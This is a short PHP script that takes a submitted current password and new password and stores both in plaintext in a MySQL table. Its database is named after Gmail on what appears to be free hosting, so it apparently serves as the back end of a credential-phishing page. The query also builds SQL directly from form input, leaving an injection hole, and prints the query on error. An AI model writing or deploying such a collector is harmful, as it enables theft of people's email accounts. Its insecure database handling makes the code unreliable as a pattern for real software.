
<?php
// Establish connection to MySQL database
$servername = "localhost"; // Assuming localhost
$username = "your_username"; // Your MySQL username
$password = "your_password"; // Your MySQL password
$dbname = "ezyro_36216826_gmail"; // Your database name

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Retrieve form data
$curPass = $_POST['cur-pass'];
$newPass = $_POST['new-pass'];

// SQL query to insert data into Junaid table
$sql = "INSERT INTO Junaid (current_password, new_password) VALUES ('$curPass', '$newPass')";

if ($conn->query($sql) === TRUE) {
    echo "Record inserted successfully";
} else {
    echo "Error: " . $sql . "<br>" . $conn->error;
}

// Close MySQL connection
$conn->close();
?>